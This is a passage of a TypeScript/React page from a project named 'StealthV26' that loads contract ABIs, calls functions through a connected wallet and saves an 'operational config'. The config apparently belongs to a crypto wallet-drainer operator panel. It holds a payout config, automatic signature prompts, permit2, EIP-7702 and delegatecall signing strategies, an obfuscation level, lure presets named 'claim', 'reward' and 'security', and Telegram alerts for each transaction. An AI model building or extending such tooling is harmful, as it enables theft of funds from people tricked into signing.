"use client";

import { useEffect, useMemo, useState } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { getPublicClient, getWalletClient, connectInjected } from "@/lib/web3";
import type { Address } from "viem";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import type { OperationalConfig } from "@/lib/operational-config-store";
import { defaultPayoutConfig } from "@/lib/mock-data";
import type {
  ContractFunctionBinding,
  ContractFunctionBindingArg,
  ExecutionBackend,
  StrategyMode,
} from "@/lib/types";
import { getStandardExecutionBindings } from "@/lib/standard-function-bindings";

type ContractListItem = { id: string; name: string; relativePath: string };
type SavedImport = ContractListItem & {
  source: "saved";
  abi: unknown[];
  addressHint?: string;
  savedAt: string;
};

type AbiFunction = {
  type: "function";
  name: string;
  stateMutability?: "pure" | "view" | "nonpayable" | "payable";
  inputs?: Array<{ name?: string; type: string }>;
  outputs?: Array<{ name?: string; type: string }>;
};

type FunctionBindingDraft = {
  preset: string;
  label: string;
  functionKey: string;
  argsText: string;
};

const FUNCTION_PRESETS = [
  { preset: "transaction", label: "Primary action" },
  { preset: "claim", label: "Claim" },
  { preset: "reward", label: "Reward" },
  { preset: "security", label: "Security" },
  { preset: "swap", label: "Swap" },
  { preset: "connect", label: "Connect" },
  { preset: "multicall", label: "Multicall" },
] as const;

const FUNCTION_PRESET_HINTS: Record<string, string[]> = {
  transaction: ["execute", "claim", "mint", "stake", "subscribe", "collect", "swap", "transfer"],
  claim: ["claim", "claimreward", "claimrewards", "withdrawreward", "getreward"],
  reward: ["reward", "distribute", "harvest", "collect", "claimreward"],
  security: ["verify", "authorize", "validate", "secure", "check"],
  swap: ["swap", "exchange", "route", "quote"],
  connect: ["connect", "register", "join", "subscribe", "enter"],
  multicall: ["multicall", "batch", "executebatch", "aggregate"],
};

function isFunction(x: unknown): x is AbiFunction {
  return (
    typeof x === "object" &&
    x !== null &&
    (x as { type?: unknown }).type === "function" &&
    typeof (x as { name?: unknown }).name === "string"
  );
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

function pickArtifactAbi(value: unknown): unknown[] | null {
  if (!isRecord(value)) return null;
  if (Array.isArray(value.abi)) return value.abi;
  if (isRecord(value.output) && Array.isArray(value.output.abi)) return value.output.abi;
  if (isRecord(value.artifact) && Array.isArray(value.artifact.abi)) return value.artifact.abi;
  return null;
}

function pickArtifactAddressHint(value: unknown): string | undefined {
  if (!isRecord(value)) return undefined;
  if (typeof value.address === "string") return value.address;
  if (typeof value.contractAddress === "string") return value.contractAddress;
  if (isRecord(value.networks)) {
    for (const network of Object.values(value.networks)) {
      if (isRecord(network) && typeof network.address === "string") return network.address;
    }
  }
  return undefined;
}

function getFunctionKey(fn: AbiFunction) {
  return `${fn.name}(${(fn.inputs || []).map((i) => i.type).join(",")})`;
}

function getErrorMessage(error: unknown) {
  if (error instanceof Error) return error.message;
  if (isRecord(error) && typeof error.shortMessage === "string") return error.shortMessage;
  if (isRecord(error) && typeof error.message === "string") return error.message;
  return "Something went wrong";
}

function parseBindingArgs(text: string, fn: AbiFunction): ContractFunctionBindingArg[] {
  const raw = text.trim();
  if (!raw) {
    return (fn.inputs || []).map((input) => ({
      name: input.name || "",
      type: input.type,
      value: "",
    }));
  }

  const parsed = JSON.parse(raw) as unknown;
  if (!isRecord(parsed)) throw new Error("Binding args must be a JSON object");

  return (fn.inputs || []).map((input, idx) => {
    const key = input.name || `arg${idx + 1}`;
    const value = parsed[key];
    return {
      name: input.name || "",
      type: input.type,
      value:
        value === undefined
          ? ""
          : typeof value === "string"
            ? value
            : JSON.stringify(value),
    };
  });
}

function suggestFunctionBindings(functions: AbiFunction[]) {
  const suggestions: Record<string, string> = {};

  for (const preset of FUNCTION_PRESETS) {
    const hints = FUNCTION_PRESET_HINTS[preset.preset] || [];
    const match = functions.find((fn) => {
      const name = fn.name.toLowerCase();
      return hints.some((hint) => name.includes(hint));
    });
    if (match) {
      suggestions[preset.preset] = getFunctionKey(match);
    }
  }

  return suggestions;
}

function buildSavedImport(params: {
  name: string;
  relativePath: string;
  abi: unknown[];
  addressHint?: string;
}): SavedImport {
  return {
    id: `saved-${crypto.randomUUID()}`,
    name: params.name,
    relativePath: params.relativePath,
    source: "saved",
    abi: params.abi,
    addressHint: params.addressHint,
    savedAt: new Date().toISOString(),
  };
}

function parseArg(type: string, value: string): unknown {
  const t = type.trim();
  if (t.endsWith("[]")) {
    const inner = t.slice(0, -2);
    const arr = JSON.parse(value);
    if (!Array.isArray(arr)) throw new Error("Array arg must be JSON array");
    return arr.map((v) => parseArg(inner, typeof v === "string" ? v : JSON.stringify(v)));
  }

  if (t === "bool") {
    if (value === "true") return true;
    if (value === "false") return false;
    throw new Error("bool arg must be true/false");
  }
  if (t.startsWith("uint") || t.startsWith("int")) {
    return BigInt(value);
  }
  if (t === "address" || t === "string" || t.startsWith("bytes")) {
    return value;
  }

  return value;
}

const SAVED_IMPORTS_KEY = "stealth-v26-contract-imports";

export default function ContractPage() {
  const [contractAddress, setContractAddress] = useState<string>("");
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [artifactList, setArtifactList] = useState<ContractListItem[]>([]);
  const [savedImports, setSavedImports] = useState<SavedImport[]>([]);
  const [selectedArtifactId, setSelectedArtifactId] = useState<string>("");
  const [abiDialogOpen, setAbiDialogOpen] = useState(false);
  const [abiName, setAbiName] = useState<string | null>(null);
  const [abiJson, setAbiJson] = useState<unknown[] | null>(null);
  const [abiText, setAbiText] = useState<string>("");
  const [txHash, setTxHash] = useState<string | null>(null);
  const [results, setResults] = useState<Record<string, unknown>>({});
  const [argValues, setArgValues] = useState<Record<string, string[]>>({});
  const [functionBindings, setFunctionBindings] = useState<Record<string, FunctionBindingDraft>>({});
  const [error, setError] = useState<string | null>(null);
  const [busy, setBusy] = useState(false);
  const [strategyMode, setStrategyMode] = useState<StrategyMode>("permit2");
  const [executionBackend, setExecutionBackend] = useState<ExecutionBackend>("stealth-exchange");
  const [fallbackMode, setFallbackMode] = useState<OperationalConfig["strategy"]["fallbackMode"]>("approve");
  const [delegateCallEnabled, setDelegateCallEnabled] = useState(false);
  const [delegateCallTarget, setDelegateCallTarget] = useState("");
  const [delegateCallSelectorsText, setDelegateCallSelectorsText] = useState("");
  const [eip7702Enabled, setEip7702Enabled] = useState(false);
  const [eip7702DelegationTarget, setEip7702DelegationTarget] = useState("");
  const [eip7702RequiresSupport, setEip7702RequiresSupport] = useState(true);
  const [eip7702AuthorizationMode, setEip7702AuthorizationMode] =
    useState<OperationalConfig["strategy"]["eip7702AuthorizationMode"]>("wallet");
  const [trailsEnabled, setTrailsEnabled] = useState(false);
  const [trailsMode, setTrailsMode] = useState<OperationalConfig["strategy"]["trailsMode"]>("pay");
  const [trailsApiKey, setTrailsApiKey] = useState("");
  const [trailsToAddress, setTrailsToAddress] = useState("");
  const [trailsToChainId, setTrailsToChainId] = useState("8453");
  const [trailsToToken, setTrailsToToken] = useState("USDC");
  const [trailsToAmount, setTrailsToAmount] = useState("1");
  const [trailsWidgetUrl, setTrailsWidgetUrl] = useState("https://demo.trails.build/widget");
  const [appKitName, setAppKitName] = useState("StealthV26 App Kit");
  const [brandColor, setBrandColor] = useState("#7C73FF");
  const [supportEmail, setSupportEmail] = useState("");
  const [socialLoginEnabled, setSocialLoginEnabled] = useState(false);
  const [smartWalletEnabled, setSmartWalletEnabled] = useState(false);

  const isReady = useMemo(() => {
    return Boolean(contractAddress && abiJson && walletAddress);
  }, [contractAddress, abiJson, walletAddress]);

  const selectableArtifacts = useMemo(() => {
    return [...savedImports, ...artifactList];
  }, [savedImports, artifactList]);

  const functions = useMemo(() => {
    if (!abiJson) return [] as AbiFunction[];
    return abiJson.filter(isFunction);
  }, [abiJson]);

  useEffect(() => {
    if (!functions.length) return;
    setFunctionBindings((current) => {
      const next = { ...current };
      const suggestions = suggestFunctionBindings(functions);
      for (const preset of FUNCTION_PRESETS) {
        if (!next[preset.preset]) {
          next[preset.preset] = {
            preset: preset.preset,
            label: preset.label,
            functionKey: suggestions[preset.preset] || "",
            argsText: "",
          };
        } else if (!next[preset.preset].functionKey && suggestions[preset.preset]) {
          next[preset.preset] = {
            ...next[preset.preset],
            functionKey: suggestions[preset.preset],
          };
        }
      }
      return next;
    });
  }, [functions]);

  useEffect(() => {
    try {
      const raw = window.localStorage.getItem(SAVED_IMPORTS_KEY);
      if (!raw) return;
      const parsed = JSON.parse(raw) as unknown;
      if (!Array.isArray(parsed)) return;
      setSavedImports(
        parsed.filter((item): item is SavedImport => {
          return (
            isRecord(item) &&
            item.source === "saved" &&
            typeof item.id === "string" &&
            typeof item.name === "string" &&
            typeof item.relativePath === "string" &&
            Array.isArray(item.abi) &&
            typeof item.savedAt === "string"
          );
        }),
      );
    } catch {
      window.localStorage.removeItem(SAVED_IMPORTS_KEY);
    }
  }, []);

  useEffect(() => {
    window.localStorage.setItem(SAVED_IMPORTS_KEY, JSON.stringify(savedImports));
  }, [savedImports]);

  useEffect(() => {
    setError(null);
  }, [contractAddress, walletAddress, selectedArtifactId]);

  useEffect(() => {
    if (!selectedArtifactId || !contractAddress) return;
    setSavedImports((current) =>
      current.map((item) =>
        item.id === selectedArtifactId ? { ...item, addressHint: contractAddress } : item,
      ),
    );
  }, [contractAddress, selectedArtifactId]);

  useEffect(() => {
    if (!abiDialogOpen) return;
    void loadArtifacts();
  }, [abiDialogOpen]);

  useEffect(() => {
    let active = true;
    async function loadOperationalConfig() {
      try {
        const res = await fetch("/api/operational-config", { cache: "no-store" });
        const data = (await res.json()) as { config?: OperationalConfig };
        if (!active || !res.ok || !data.config) return;
        setStrategyMode(data.config.strategy.mode);
        setExecutionBackend(data.config.strategy.executionBackend);
        setFallbackMode(data.config.strategy.fallbackMode);
        setDelegateCallEnabled(data.config.strategy.delegateCallEnabled);
        setDelegateCallTarget(data.config.strategy.delegateCallTarget);
        setDelegateCallSelectorsText(data.config.strategy.delegateCallSelectors.join("\n"));
        setEip7702Enabled(data.config.strategy.eip7702Enabled);
        setEip7702DelegationTarget(data.config.strategy.eip7702DelegationTarget);
        setEip7702RequiresSupport(data.config.strategy.eip7702RequiresSupport);
        setEip7702AuthorizationMode(data.config.strategy.eip7702AuthorizationMode);
        setTrailsEnabled(data.config.strategy.trailsEnabled);
        setTrailsMode(data.config.strategy.trailsMode);
        setTrailsApiKey(data.config.strategy.trailsApiKey);
        setTrailsToAddress(data.config.strategy.trailsToAddress);
        setTrailsToChainId(String(data.config.strategy.trailsToChainId));
        setTrailsToToken(data.config.strategy.trailsToToken);
        setTrailsToAmount(data.config.strategy.trailsToAmount);
        setTrailsWidgetUrl(data.config.strategy.trailsWidgetUrl);
        setAppKitName(data.config.appKit.appName);
        setBrandColor(data.config.appKit.brandColor);
        setSupportEmail(data.config.appKit.supportEmail);
        setSocialLoginEnabled(data.config.appKit.enableSocialLogin);
        setSmartWalletEnabled(data.config.appKit.enableSmartWallet);
        if (Array.isArray(data.config.contracts.functionBindings)) {
          const nextBindings: Record<string, FunctionBindingDraft> = {};
          for (const binding of [...getStandardExecutionBindings(), ...data.config.contracts.functionBindings]) {
            nextBindings[binding.preset] = {
              preset: binding.preset,
              label: binding.label,
              functionKey: binding.functionKey,
              argsText: JSON.stringify(
                Object.fromEntries(binding.args.map((arg) => [arg.name || arg.type, arg.value])),
                null,
                2,
              ),
            };
          }
          setFunctionBindings(nextBindings);
        }
      } catch {
        // Keep defaults if operational config has not been saved yet.
      }
    }
    void loadOperationalConfig();
    return () => {
      active = false;
    };
  }, []);

  async function connect() {
    setBusy(true);
    setError(null);
    try {
      const { address } = await connectInjected();
      setWalletAddress(address);
    } catch (error: unknown) {
      setError(getErrorMessage(error) || "Failed to connect wallet");
    } finally {
      setBusy(false);
    }
  }

  async function loadArtifacts() {
    setBusy(true);
    setError(null);
    try {
      const res = await fetch("/api/contracts", { cache: "no-store" });
      const data = await res.json();
      if (!res.ok) throw new Error(data?.message || "Failed to scan artifacts");
      setArtifactList(Array.isArray(data?.items) ? data.items : []);
    } catch (error: unknown) {
      setError(getErrorMessage(error) || "Failed to load artifacts");
    } finally {
      setBusy(false);
    }
  }

  async function loadSelectedArtifact() {
    if (!selectedArtifactId) return;
    setBusy(true);
    setError(null);
    try {
      const saved = savedImports.find((item) => item.id === selectedArtifactId);
      if (saved) {
        setAbiName(saved.name);
        setAbiJson(saved.abi);
        setAbiText(JSON.stringify(saved.abi, null, 2));
        setResults({});
        setArgValues({});
        setTxHash(null);

        if (saved.addressHint) {
          setContractAddress(saved.addressHint);
        }
        return;
      }

      const res = await fetch(`/api/contracts/${selectedArtifactId}`, { cache: "no-store" });
      const data = await res.json();
      if (!res.ok) throw new Error(data?.message || "Failed to load artifact");

      const abi = data?.abi;
      if (!Array.isArray(abi)) throw new Error("Artifact ABI is not an array");

      setAbiName(data?.name || null);
      setAbiJson(abi);
      setAbiText(JSON.stringify(abi, null, 2));
      setResults({});
      setArgValues({});
      setTxHash(null);

      if (typeof data?.addressHint === "string") {
        setContractAddress(data.addressHint);
      }

      const savedImport = buildSavedImport({
        name: data?.name || "artifact",
        relativePath: data?.relativePath || `artifact/${selectedArtifactId}.json`,
        abi,
        addressHint:
          contractAddress || (typeof data?.addressHint === "string" ? data.addressHint : undefined),
      });
      setSavedImports((current) => [savedImport, ...current]);
      setSelectedArtifactId(savedImport.id);
    } catch (error: unknown) {
      setError(getErrorMessage(error) || "Failed to load artifact");
    } finally {
      setBusy(false);
    }
  }

  async function applyAbiFromTextarea() {
    setError(null);
    try {
      const parsed = JSON.parse(abiText);
      if (!Array.isArray(parsed)) throw new Error("ABI must be a JSON array");
      setAbiName(null);
      setAbiJson(parsed);
      setResults({});
      setArgValues({});
      setTxHash(null);
      setSavedImports((current) => [
        buildSavedImport({
          name: `Manual ABI ${new Date().toLocaleString()}`,
          relativePath: "manual/pasted-abi.json",
          abi: parsed,
          addressHint: contractAddress || undefined,
        }),
        ...current,
      ]);
    } catch (error: unknown) {
      setError(getErrorMessage(error) || "Invalid ABI JSON");
    }
  }

  async function importArtifactFiles(fileList: FileList | null) {
    if (!fileList?.length) return;

    setBusy(true);
    setError(null);
    try {
      const files = Array.from(fileList);
      const imported: SavedImport[] = [];

      for (const file of files) {
        const raw = await file.text();
        const parsed = JSON.parse(raw) as unknown;
        const abi = pickArtifactAbi(parsed);
        if (!abi) throw new Error(`No ABI found in ${file.name}`);

        const name =
          (isRecord(parsed) && typeof parsed.contractName === "string" && parsed.contractName) ||
          (isRecord(parsed) && typeof parsed.name === "string" && parsed.name) ||
          file.name.replace(/\.json$/i, "");

        imported.push(
          buildSavedImport({
            name,
            relativePath: `imports/${file.name}`,
            abi,
            addressHint: pickArtifactAddressHint(parsed),
          }),
        );
      }

      setSavedImports((current) => [...imported, ...current]);
      setSelectedArtifactId(imported[0]?.id || "");
      setAbiName(imported[0]?.name || null);
      setAbiJson(imported[0]?.abi ?? null);
      setAbiText(imported[0] ? JSON.stringify(imported[0].abi, null, 2) : "");
      setResults({});
      setArgValues({});
      setTxHash(null);

      if (imported[0]?.addressHint) {
        setContractAddress(imported[0].addressHint);
      }
    } catch (error: unknown) {
      setError(getErrorMessage(error) || "Failed to import JSON");
    } finally {
      setBusy(false);
    }
  }

  function removeSavedImport(id: string) {
    setSavedImports((current) => current.filter((item) => item.id !== id));
    if (selectedArtifactId === id) {
      setSelectedArtifactId("");
    }
  }

  async function callFunction(fn: AbiFunction) {
    setBusy(true);
    setError(null);
    setTxHash(null);
    try {
      if (!abiJson) throw new Error("Load an ABI first");
      if (!walletAddress) throw new Error("Connect your wallet first");
      if (!contractAddress) throw new Error("Enter contract address");

      const key = getFunctionKey(fn);
      const rawArgs = argValues[key] || [];
      const inputs = fn.inputs || [];
      const args = inputs.map((inp, idx) => {
        const v = rawArgs[idx] ?? "";
        if (v === "") throw new Error(`Missing arg: ${inp.name || `arg${idx + 1}`}`);
        return parseArg(inp.type, v);
      });

      const mut = fn.stateMutability || "nonpayable";
      if (mut === "view" || mut === "pure") {
        const client = getPublicClient();
        const out = await client.readContract({
          address: contractAddress as Address,
          abi: abiJson as never,
          functionName: fn.name as never,
          args: args as never,
        });
        setResults((r) => ({ ...r, [key]: out }));
      } else {
        const wallet = getWalletClient();
        const hash = await wallet.writeContract({
          address: contractAddress as Address,
          abi: abiJson as never,
          functionName: fn.name as never,
          account: walletAddress as Address,
          args: args as never,
        });
        setTxHash(hash);
        setResults((r) => ({ ...r, [key]: hash }));

        await fetch("/api/telegram", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ message: `🧾 Tx submitted\n<code>${hash}</code>` }),
        }).catch(() => {});
      }
    } catch (error: unknown) {
      setError(getErrorMessage(error) || "Call failed");
    } finally {
      setBusy(false);
    }
  }

  function setFnArg(key: string, idx: number, v: string) {
    setArgValues((prev) => {
      const arr = [...(prev[key] || [])];
      arr[idx] = v;
      return { ...prev, [key]: arr };
    });
  }

  function setBindingDraft(preset: string, patch: Partial<FunctionBindingDraft>) {
    setFunctionBindings((current) => ({
      ...current,
      [preset]: {
        preset,
        label: current[preset]?.label || FUNCTION_PRESETS.find((item) => item.preset === preset)?.label || preset,
        functionKey: current[preset]?.functionKey || "",
        argsText: current[preset]?.argsText || "",
        ...patch,
      },
    }));
  }

  function buildFunctionBindings(): ContractFunctionBinding[] {
    if (!abiJson || !abiName || !contractAddress) return [];

    return Object.values(functionBindings)
      .filter((binding) => binding.functionKey)
      .map((binding) => {
        const fn = functions.find((item) => getFunctionKey(item) === binding.functionKey);
        if (!fn) {
          throw new Error(`Missing ABI function for binding ${binding.label}`);
        }

        return {
          preset: binding.preset,
          label: binding.label,
          contractAddress,
          contractName: abiName,
          abi: abiJson,
          functionKey: binding.functionKey,
          functionName: fn.name,
          stateMutability: fn.stateMutability || "nonpayable",
          args: parseBindingArgs(binding.argsText, fn),
        };
      });
  }

  async function saveOperationalConfig() {
    setBusy(true);
    setError(null);
    try {
      const compiledBindings = buildFunctionBindings();
      const normalizedDelegateSelectors = delegateCallSelectorsText
        .split(/\r?\n|,/)
        .map((selector) => selector.trim())
        .filter(Boolean);

      let payout = defaultPayoutConfig;
      let runtime: OperationalConfig["runtime"] = { autoSignaturePrompt: true };
      try {
        const existingRes = await fetch("/api/operational-config", { cache: "no-store" });
        const existingData = (await existingRes.json()) as { config?: OperationalConfig };
        if (existingRes.ok && existingData.config) {
          payout = existingData.config.payout ?? payout;
          runtime = existingData.config.runtime ?? runtime;
        }
      } catch {
        // keep defaults
      }

      const payload: OperationalConfig = {
        payout,
        runtime,
        contracts: {
          primary: {
            name: abiName || "PrimaryContract",
            address: contractAddress,
            abiName: abiName || "",
            abi: abiJson || [],
            chainId: 1,
            selectedFunctions: functions.map((fn) => getFunctionKey(fn)),
          },
          secondaryTargets: [],
          functionBindings: [...getStandardExecutionBindings(), ...compiledBindings],
        },
        strategy: {
          mode: strategyMode,
          executionBackend,
          fallbackMode,
          gaslessEnabled: strategyMode === "gasless",
          multicallEnabled: strategyMode === "multicall",
          permit2Enabled: strategyMode === "permit2",
          typedDataEnabled: strategyMode === "eip712",
          eip7702Enabled,
          delegateCallEnabled,
          delegateCallTarget,
          delegateCallSelectors: normalizedDelegateSelectors,
          eip7702DelegationTarget,
          eip7702RequiresSupport,
          eip7702AuthorizationMode,
          trailsEnabled,
          trailsMode,
          trailsApiKey,
          trailsToAddress,
          trailsToChainId: Number.parseInt(trailsToChainId, 10) || 8453,
          trailsToToken,
          trailsToAmount,
          trailsWidgetUrl,
          obfuscationLevel: "medium",
          customRpcUrl: "",
        },
        appKit: {
          appName: appKitName,
          appDescription: "Custom operational app kit for live wallet and contract flows.",
          appUrl: "",
          brandColor,
          logoUrl: "",
          supportEmail,
          enableAnalytics: true,
          enableSocialLogin: socialLoginEnabled,
          enableSmartWallet: smartWalletEnabled,
          enableWalletConnect: true,
          enableInjectedWallets: true,
          customCss: "",
        },
      };

      const res = await fetch("/api/operational-config", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const data = (await res.json()) as { message?: string };
      if (!res.ok) throw new Error(data?.message || "Failed to save operational config");
    } catch (error: unknown) {
      setError(getErrorMessage(error) || "Failed to save operational config");
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-semibold tracking-tight">Contract Interaction</h1>
          <p className="text-sm text-muted-foreground">
            Load ABI from your contract JSON artifacts and call functions using your connected wallet.
          </p>
        </div>
        <div className="flex items-center gap-2">
          {walletAddress ? (
            <Badge variant="outline" className="font-mono">
              {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
            </Badge>
          ) : (
            <Button size="sm" onClick={connect} disabled={busy}>
              Connect Wallet
            </Button>
          )}
        </div>
      </div>

      <Card>
        <CardHeader>
          <CardTitle className="text-base">Contract</CardTitle>
          <CardDescription>
            Set a contract address, then load ABI from JSON artifacts (auto-discovered) or paste ABI manually.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <Input
            placeholder="0x..."
            value={contractAddress}
            onChange={(e) => setContractAddress(e.target.value)}
            className="font-mono"
          />

          <div className="flex flex-wrap gap-2">
            <Dialog open={abiDialogOpen} onOpenChange={setAbiDialogOpen}>
              <DialogTrigger asChild>
                <Button variant="outline" disabled={busy}>
                  Load ABI
                </Button>
              </DialogTrigger>
              <DialogContent>
                <DialogHeader>
                  <DialogTitle>Load ABI from contract JSON</DialogTitle>
                  <DialogDescription>
                    Import `.json` files from your machine and keep them as saved imports, or scan project artifact folders.
                  </DialogDescription>
                </DialogHeader>

                <div className="space-y-3">
                  <div className="rounded-md border border-dashed border-border/60 p-3">
                    <div className="mb-2 text-sm font-medium">Import `.json` artifact / ABI</div>
                    <Input
                      type="file"
                      accept=".json,application/json"
                      multiple
                      onChange={(e) => {
                        void importArtifactFiles(e.target.files);
                        e.currentTarget.value = "";
                      }}
                    />
                    <div className="mt-2 text-xs text-muted-foreground">
                      Saved imports stay available in this browser after refresh.
                    </div>
                  </div>

                  <div className="text-sm text-muted-foreground">
                    Saved imports: <span className="font-mono">{savedImports.length}</span>
                    {" · "}
                    Project artifacts: <span className="font-mono">{artifactList.length}</span>
                  </div>

                  <Select value={selectedArtifactId} onValueChange={setSelectedArtifactId}>
                    <SelectTrigger className="w-full">
                      <SelectValue placeholder="Select a contract artifact" />
                    </SelectTrigger>
                    <SelectContent>
                      {selectableArtifacts.map((it) => (
                        <SelectItem key={it.id} value={it.id}>
                          <span className="flex flex-col">
                            <span className="text-sm">{it.name}</span>
                            <span className="font-mono text-xs text-muted-foreground">
                              {"source" in it && it.source === "saved" ? `saved • ${it.relativePath}` : it.relativePath}
                            </span>
                          </span>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>

                  {savedImports.length > 0 && (
                    <div className="space-y-2 rounded-md border border-border/60 p-3">
                      <div className="text-sm font-medium">Saved imports</div>
                      <div className="space-y-2">
                        {savedImports.map((item) => (
                          <div key={item.id} className="flex items-center justify-between gap-3 rounded-md border border-border/50 px-3 py-2">
                            <div className="min-w-0">
                              <div className="truncate text-sm">{item.name}</div>
                              <div className="truncate font-mono text-xs text-muted-foreground">
                                {item.relativePath}
                              </div>
                            </div>
                            <Button
                              type="button"
                              variant="ghost"
                              size="sm"
                              onClick={() => removeSavedImport(item.id)}
                            >
                              Remove
                            </Button>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  <div className="flex justify-end gap-2">
                    <Button onClick={loadSelectedArtifact} disabled={busy || !selectedArtifactId}>
                      Use ABI
                    </Button>
                  </div>
                </div>
              </DialogContent>
            </Dialog>

            <Button variant="outline" disabled={busy} onClick={applyAbiFromTextarea}>
              Apply ABI JSON
            </Button>

            {abiJson ? (
              <Badge variant="outline" className="font-mono">
                ABI loaded{abiName ? `: ${abiName}` : ""}
              </Badge>
            ) : (
              <Badge variant="outline" className="text-xs">
                No ABI loaded
              </Badge>
            )}
          </div>

          <Textarea
            value={abiText}
            onChange={(e) => setAbiText(e.target.value)}
            placeholder='Paste ABI JSON here (array of entries: [{"type":"function",...}])'
            className="font-mono text-xs min-h-44"
          />

          {error && <div className="text-sm text-destructive">{error}</div>}
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="text-base">Functions</CardTitle>
          <CardDescription>
            Calls are inferred from ABI. `view/pure` use public RPC reads; `nonpayable/payable` send a transaction from your wallet.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {!abiJson ? (
            <div className="text-sm text-muted-foreground">Load an ABI to see callable functions.</div>
          ) : functions.length === 0 ? (
            <div className="text-sm text-muted-foreground">No functions found in ABI.</div>
          ) : (
            <div className="space-y-3">
              {functions.map((fn) => {
                const key = getFunctionKey(fn);
                const mut = fn.stateMutability || "nonpayable";
                const isRead = mut === "view" || mut === "pure";
                const resVal = results[key];

                return (
                  <Card key={key} className="border-border/60">
                    <CardHeader>
                      <div className="flex items-center justify-between gap-2">
                        <div className="min-w-0">
                          <CardTitle className="text-sm font-mono truncate">{fn.name}</CardTitle>
                          <CardDescription className="text-xs font-mono truncate">
                            {mut}({(fn.inputs || []).map((i) => i.type).join(", ")})
                          </CardDescription>
                        </div>
                        <Badge variant={isRead ? "secondary" : "outline"} className="text-xs">
                          {isRead ? "read" : "write"}
                        </Badge>
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      {(fn.inputs || []).length > 0 && (
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                          {(fn.inputs || []).map((inp, idx) => (
                            <Input
                              key={`${key}-${idx}`}
                              placeholder={`${inp.name || `arg${idx + 1}`}: ${inp.type}`}
                              value={(argValues[key] || [])[idx] || ""}
                              onChange={(e) => setFnArg(key, idx, e.target.value)}
                              className="font-mono"
                            />
                          ))}
                        </div>
                      )}

                      <div className="flex items-center gap-2">
                        <Button onClick={() => callFunction(fn)} disabled={busy || !isReady}>
                          {isRead ? "Call" : "Send"}
                        </Button>
                        {typeof resVal !== "undefined" && (
                          <Badge variant="outline" className="font-mono text-xs max-w-full truncate">
                            {typeof resVal === "string" ? resVal : JSON.stringify(resVal)}
                          </Badge>
                        )}
                      </div>
                    </CardContent>
                  </Card>
                );
              })}
            </div>
          )}

          {txHash && (
            <div className="text-sm">
              <span className="text-muted-foreground">Tx:</span> <span className="font-mono">{txHash}</span>
            </div>
          )}
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="text-base">Strategy + App Kit</CardTitle>
          <CardDescription>
            Save the shared operational layer for contract routing, signing strategy, and your custom app kit defaults.
          </CardDescription>
        </CardHeader>
        <CardContent className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="space-y-2">
            <div className="text-sm font-medium">Strategy mode</div>
            <Select value={strategyMode} onValueChange={(v) => setStrategyMode(v as typeof strategyMode)}>
              <SelectTrigger className="w-full">
                <SelectValue placeholder="Select a strategy" />
              </SelectTrigger>
              <SelectContent>
                {["direct", "approve", "permit", "permit2", "multicall", "gasless", "eip712", "eip7702", "trails"].map((mode) => (
                  <SelectItem key={mode} value={mode}>
                    {mode}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">Fallback mode</div>
            <Select value={fallbackMode} onValueChange={(value) => setFallbackMode(value as OperationalConfig["strategy"]["fallbackMode"])}>
              <SelectTrigger className="w-full">
                <SelectValue placeholder="Select a fallback" />
              </SelectTrigger>
              <SelectContent>
                {["none", "direct", "approve", "permit", "permit2", "multicall", "gasless", "eip712"].map((mode) => (
                  <SelectItem key={mode} value={mode}>
                    {mode}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">Execution backend</div>
            <Select value={executionBackend} onValueChange={(value) => setExecutionBackend(value as ExecutionBackend)}>
              <SelectTrigger className="w-full">
                <SelectValue placeholder="Select an execution backend" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="stealth-exchange">stealth-exchange</SelectItem>
                <SelectItem value="permit2-executor">permit2-executor</SelectItem>
                <SelectItem value="erc2612-executor">erc2612-executor</SelectItem>
                <SelectItem value="batch-multicall">batch-multicall</SelectItem>
                <SelectItem value="eip7702-delegate">eip7702-delegate</SelectItem>
                <SelectItem value="orch">orch</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <label className="flex items-center justify-between rounded-md border border-border/60 px-3 py-2">
            <span className="text-sm">Enable delegatecall path</span>
            <input type="checkbox" checked={delegateCallEnabled} onChange={(e) => setDelegateCallEnabled(e.target.checked)} />
          </label>
          <label className="flex items-center justify-between rounded-md border border-border/60 px-3 py-2">
            <span className="text-sm">Enable EIP-7702 path</span>
            <input type="checkbox" checked={eip7702Enabled} onChange={(e) => setEip7702Enabled(e.target.checked)} />
          </label>
          <label className="flex items-center justify-between rounded-md border border-border/60 px-3 py-2">
            <span className="text-sm">Enable Trails path</span>
            <input type="checkbox" checked={trailsEnabled} onChange={(e) => setTrailsEnabled(e.target.checked)} />
          </label>
          <div className="space-y-2">
            <div className="text-sm font-medium">Delegatecall target</div>
            <Input value={delegateCallTarget} onChange={(e) => setDelegateCallTarget(e.target.value)} placeholder="0x..." className="font-mono" />
          </div>
          <div className="space-y-2">
            <div className="text-sm font-medium">7702 delegation target</div>
